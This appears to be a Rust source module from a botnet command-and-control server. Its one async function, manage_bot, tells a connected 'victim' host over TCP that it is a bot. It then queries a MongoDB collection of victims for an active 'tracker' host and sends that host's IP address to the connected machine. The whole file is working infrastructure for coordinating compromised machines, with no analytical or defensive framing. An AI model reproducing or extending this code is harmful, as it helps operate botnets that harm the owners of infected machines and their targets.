use crate::victim::Victim;

use tokio::{net::TcpStream, io::AsyncWriteExt};
use mongodb::Collection;
use mongodb::bson::{doc, to_bson};

use crate::victim::{VictimDb, VictimType};

pub async fn manage_bot(_victim: &Victim, stream: &mut TcpStream, victims_collection: &Collection<VictimDb>) -> Result<(), Box<dyn std::error::Error>> {
    stream.write_all(b"bot\0").await?;
    
    let tracker = victims_collection.find_one(doc! {"status": true, "victim_type": to_bson(&VictimType::Tracker).unwrap() }, None).await.unwrap();

    if let Some(tracker) = tracker {
        stream.write_all(("tracker ".to_string() + &tracker.ip + "\0").as_bytes()).await?;
    } else {
        stream.write_all(b"None 0.0.0.0\0").await?;
    }

    Ok(())
}
